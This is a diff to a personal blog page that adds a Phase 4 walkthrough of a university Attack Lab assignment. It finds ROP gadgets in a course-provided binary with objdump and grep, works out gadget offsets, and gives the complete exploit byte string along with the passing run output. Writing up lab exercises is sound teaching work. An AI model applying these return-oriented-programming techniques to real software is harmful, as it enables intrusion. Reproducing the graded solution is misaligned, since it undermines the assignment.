@@ -13,9 +13,9 @@
     <meta name="og:url" content="https://web.navan.dev/" />
     <meta name="twitter:title" content="Attack Lab" />
     <meta name="og:title" content="Attack Lab" />
-    <meta name="description" content="Walkthrough of Attack Lab Phases 1-3 for CSCI 2400 Computer Systems" />
-    <meta name="twitter:description" content="Walkthrough of Attack Lab Phases 1-3 for CSCI 2400 Computer Systems" />
-    <meta name="og:description" content="Walkthrough of Attack Lab Phases 1-3 for CSCI 2400 Computer Systems" />
+    <meta name="description" content="Walkthrough of Attack Lab Phases 1-4 for CSCI 2400 Computer Systems" />
+    <meta name="twitter:description" content="Walkthrough of Attack Lab Phases 1-4 for CSCI 2400 Computer Systems" />
+    <meta name="og:description" content="Walkthrough of Attack Lab Phases 1-4 for CSCI 2400 Computer Systems" />
     <meta name="twitter:card" content="summary_large_image" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <link rel="shortcut icon" href="/images/favicon.png" type="image/png" />
@@ -380,6 +380,129 @@ NICE<span class="w"> </span>JOB!
 </div>
 
 <p>Phases 1-3 Complete.</p>
+
+<h2>Phase 4</h2>
+
+<blockquote>
+  <p>For Phase 4, you will repeat the attack of Phase 2, but do so on program RTARGET using gadgets from your
+  gadget farm. You can construct your solution using gadgets consisting of the following instruction types,
+  and using only the first eight x86-64 registers (%rax–%rdi).
+  * movq
+  * popq
+  * ret
+  * nop</p>
+</blockquote>
+
+<blockquote>
+  <p>All the gadgets you need can be found in the region of the code for rtarget demarcated by the
+  functions start<em>farm and mid</em>farm</p>
+</blockquote>
+
+<blockquote>
+  <p>You can do this attack with just two gadgets</p>
+</blockquote>
+
+<blockquote>
+  <p>When a gadget uses a popq instruction, it will pop data from the stack. As a result, your exploit
+  string will contain a combination of gadget addresses and data.</p>
+</blockquote>
+
+<p>Let us check if we can find <code>popq %rdi</code> between <code>start_farm</code> and <code>end_farm</code></p>
+
+<p>The way a normal person would find the hex representation <code>58</code> to be between <code>start_farm</code> and <code>end_farm</code> is to find the line numbers for both and 
+then search between those lines. But, what if you don't want to move away from the terminal?</p>
+
+<p>Assuming, the disassembled code for <code>rtarget</code> is stored in <code>dis2.txt</code> (<code>objdump -d rtarget &gt; dis2.txt</code>)</p>
+
+<pre><code>jovyan@jupyter-nach6988:~/lab3-attacklab-navanchauhan/target66$ sed -n '/start_farm/,/end_farm/p' dis2.txt | grep -n2 " 58"
+16-000000000040281f &lt;getval_373&gt;:
+17-  40281f:    f3 0f 1e fa             endbr64 
+18:  402823:    b8 d3 f5 c2 58          mov    $0x58c2f5d3,%eax
+19-  402828:    c3                      ret    
+20-
+--
+26-0000000000402834 &lt;setval_212&gt;:
+27-  402834:    f3 0f 1e fa             endbr64 
+28:  402838:    c7 07 58 90 c3 92       movl   $0x92c39058,(%rdi)
+29-  40283e:    c3                      ret    
+30-
+--
+41-0000000000402854 &lt;setval_479&gt;:
+42-  402854:    f3 0f 1e fa             endbr64 
+43:  402858:    c7 07 58 c7 7f 61       movl   $0x617fc758,(%rdi)
+44-  40285e:    c3                      ret    
+45-
+</code></pre>
+
+<p>If we were to pick the first one as our gadget, the instruction address is <code>0x402823</code>, but to get to the instruction <code>58</code> we need to add 4 bytes:</p>
+
+<p><code>=&gt; Gadget address = 0x402823 + 0x4 = 0x402827</code></p>
+
+<p>The PDF already provides the next gadget we are supposed to look for <code>48 89 c7</code></p>
+
+<pre><code>jovyan@jupyter-nach6988:~/lab3-attacklab-navanchauhan/target66$ sed -n '/start_farm/,/end_farm/p' dis2.txt | grep -n2 "48 89 c7"
+11-0000000000402814 &lt;setval_253&gt;:
+12-  402814:    f3 0f 1e fa             endbr64 
+13:  402818:    c7 07 48 89 c7 94       movl   $0x94c78948,(%rdi)
+14-  40281e:    c3                      ret    
+15-
+--
+31-000000000040283f &lt;getval_424&gt;:
+32-  40283f:    f3 0f 1e fa             endbr64 
+33:  402843:    b8 48 89 c7 c3          mov    $0xc3c78948,%eax
+34-  402848:    c3                      ret    
+35-
+36-0000000000402849 &lt;setval_417&gt;:
+37-  402849:    f3 0f 1e fa             endbr64 
+38:  40284d:    c7 07 48 89 c7 90       movl   $0x90c78948,(%rdi)
+39-  402853:    c3                      ret    
+40-
+jovyan@jupyter-nach6988:~/lab3-attacklab-navanchauhan/target66$ 
+</code></pre>
+
+<p>We cannot use the first match because it is followed by <code>0x94</code> instead of <code>c3</code>, either of the next two matches will work (<code>0x90</code> is <code>nop</code> and it does nothing but increment the program counter by 1)</p>
+
+<p>Again, we have to account for the offset.</p>
+
+<p>Taking <code>0x402843</code> we need to add just 1 byte. </p>
+
+<p><code>=&gt; 0x402843 + 1 = 0x402844</code></p>
+
+<p>Our answer for this file is going to be:</p>
+
+<pre><code>padding
+gadget1
+cookie
+gadget2
+touch2
+</code></pre>
+
+<div class="codehilite">
+<pre><span></span><code>jovyan@jupyter-nach6988:~/lab3-attacklab-navanchauhan/target66$<span class="w"> </span>cat<span class="w"> </span>dis2.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>touch2
+000000000040264e<span class="w"> </span>&lt;touch2&gt;:
+<span class="w">  </span><span class="m">402666</span>:<span class="w">       </span><span class="m">74</span><span class="w"> </span>2a<span class="w">                   </span>je<span class="w">     </span><span class="m">402692</span><span class="w"> </span>&lt;touch2+0x44&gt;
+<span class="w">  </span>4026b2:<span class="w">       </span>eb<span class="w"> </span>d4<span class="w">                   </span>jmp<span class="w">    </span><span class="m">402688</span><span class="w"> </span>&lt;touch2+0x3a&gt;
+</code></pre>
+</div>
+
+<pre><code>00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+27 28 40 00 00 00 00 00
+8f ee 8d 3e 00 00 00 00
+44 28 40 00 00 00 00 00
+4e 26 40 00 00 00 00 00
+</code></pre>
+
+<div class="codehilite">
+<pre><span></span><code>jovyan@jupyter-nach6988:~/lab3-attacklab-navanchauhan/target66$<span class="w"> </span>./hex2raw<span class="w"> </span>&lt;<span class="w"> </span>./rtarget.l2.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>./rtarget<span class="w"> </span>
+Cookie:<span class="w"> </span>0x3e8dee8f
+Type<span class="w"> </span>string:Touch2!:<span class="w"> </span>You<span class="w"> </span>called<span class="w"> </span>touch2<span class="o">(</span>0x3e8dee8f<span class="o">)</span>
+Valid<span class="w"> </span>solution<span class="w"> </span><span class="k">for</span><span class="w"> </span>level<span class="w"> </span><span class="m">2</span><span class="w"> </span>with<span class="w"> </span>target<span class="w"> </span>rtarget
+PASS:<span class="w"> </span>Sent<span class="w"> </span>exploit<span class="w"> </span>string<span class="w"> </span>to<span class="w"> </span>server<span class="w"> </span>to<span class="w"> </span>be<span class="w"> </span>validated.
+NICE<span class="w"> </span>JOB!
+</code></pre>
+</div>
 
 	<blockquote>If you have scrolled this far, consider subscribing to my mailing list <a href="https://listmonk.navan.dev/subscription/form">here.</a> You can subscribe to either a specific type of post you are interested in, or subscribe to everything with the "Everything" list.</blockquote>
 	<script data-isso="//comments.navan.dev/"
